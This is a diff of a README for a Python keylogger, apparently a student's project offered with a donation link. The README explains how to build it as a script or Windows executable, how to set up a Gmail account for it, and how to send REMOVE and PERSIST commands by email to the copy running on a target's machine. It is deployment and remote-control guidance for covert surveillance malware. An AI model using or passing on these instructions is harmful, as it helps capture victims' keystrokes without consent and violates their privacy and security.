@@ -7,15 +7,27 @@ It's not perfect, I wrote it like in two school days. That's why it looks rushed
 [![Video](https://img.shields.io/badge/Video-Tutorial-yellow.svg)](https://www.youtube.com/watch?v=vBwotqamsxg)
 
 ### Support
-Just another broke a** college student trying to make money. $5 would be enough, thanks.<br>
+Just another broke a** college student trying to make money. **$5** would be enough, thanks.<br>
 [![Donate](https://img.shields.io/badge/PayPal-Donate-orange.svg)](https://www.paypal.me/Msheikh03)
 
 
 **DO NOT USE YOUR PERSONAL EMAIL**
 
+### Requirements
+* Python *v3.6.x* | *3.7.x*
+* Windows **(Only if you want to compile it)**
 
 ### Install
 ```pip install -r requirements.txt```
+
+### Usage
+* Enable [less-secure-apps](https://myaccount.google.com/lesssecureapps) on your gmail
+* Change directory to the build folder
+* run python build.py -h
+* Use "-t python" option to create a normal Python File
+* Use "-t exe" option to create an executable **(Only on Windows)**
+
+**Does not compile inside a virtual environment**
 
 ### Commands
 1. REMOVE - To remove the keylogger from target
@@ -29,12 +41,3 @@ Just another broke a** college student trying to make money. $5 would be enough,
 * In the body field type a command. Right now a command is either REMOVE or PERSIST
 * Press Send and wait, the program only checks for commands every 2 minutes
 * **You're basically login into the same email as the program and sending an email to yourself**
-
-### Usage
-* Enable [less-secure-apps](https://myaccount.google.com/lesssecureapps) on your gmail
-* Change directory to the build folder
-* run python build.py -h
-* Use "-t python" option to create a normal Python File
-* Use "-t exe" option to create an executable **(Only on Windows)**
-
-**Does not compile inside a virtual environment**
